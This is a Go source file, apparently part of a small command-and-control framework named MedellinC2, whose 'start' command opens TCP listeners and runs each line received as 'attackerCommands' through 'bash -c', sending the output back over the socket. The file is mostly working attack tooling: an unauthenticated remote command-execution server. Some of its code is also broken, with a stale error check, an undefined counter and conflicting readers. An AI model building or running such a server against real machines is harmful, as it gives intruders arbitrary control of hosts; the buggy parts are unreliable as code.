/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

var logo = `
_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
 \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
	`

// startCmd represents the start command
var startCmd = &cobra.Command{
	Use:   "start",
	Short: "Starts the C2 server",
	Long:  `Starts the TCP server to begin listening and handling connections agents`,
	Run: func(cmd *cobra.Command, args []string) {
		//fmt.Println("start called")
		//listenForConnections()
		server()
	},
}

func init() {
	serverCmd.AddCommand(startCmd)
}

func handleConnection(c net.Conn) {
	fmt.Print("Agent successfully connected to MedellinC2 Server\n")
	for {
		netData, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}

		temp := strings.TrimSpace(string(netData))
		if temp == "STOP" {
			break
		}
		fmt.Println(temp)
		counter := strconv.Itoa(count) + "\n"
		c.Write([]byte(string(counter)))
	}
	c.Close()
}

func listenForConnections() {

	println(logo)
	println("Medlelin C2 Server Successfully Started...")
	println("Listeners are running over ports: " + data.GetListenerPorts())

	//Allows us to listen over multiple ports
	for _, port := range checkListenerPorts() { //When you don't really care about the index use _,
		go handlePorts(port)
	}
	for {
		time.Sleep(time.Second * 30) //without this, we cannot connect over two ports at once
	}

}

//Function to parse listener's ports for active listeners in the database.
func checkListenerPorts() []string {
	//use the strings.Split function to split a string into its comma separated values
	return strings.Split(data.GetListenerPorts(), ",")
}

func handlePorts(port string) {
	l, err := net.Listen("tcp4", ":"+port)

	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()

	for {
		connection, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		go handleConnection(connection)
		//count++
		//handle commands
		for {
			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			connection.Write(out)
		}
	}

}

//TESTING
func handleClientRequest(con net.Conn) {
	defer con.Close()

	clientReader := bufio.NewReader(con)

	for {
		// Waiting for the client request
		clientRequest, err := clientReader.ReadString('\n')

		switch err {
		case nil:
			clientRequest := strings.TrimSpace(clientRequest)
			if clientRequest == ":QUIT" {
				log.Println("client requested server to close the connection so closing")
				return
			} else {
				log.Println(clientRequest)
			}
		case io.EOF:
			log.Println("client closed the connection by terminating the process")
			return
		default:
			log.Printf("error: %v\n", err)
			return
		}

		// Responding to the client request
		if _, err = con.Write([]byte("GOT IT!\n")); err != nil {
			log.Printf("failed to respond to client: %v\n", err)
		}
	}
}

func server() {
	println(logo)
	listener, err := net.Listen("tcp", "0.0.0.0:8000")
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()
	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
	for {
		con, err := listener.Accept()
		if err != nil {
			log.Println(err)
			continue
		}

		// If you want, you can increment a counter here and inject to handleClientRequest below as client identifier
		go handleClientRequest(con)

		//attacker commands
		for {
			attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			con.Write(out)
		}
	}
}

// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
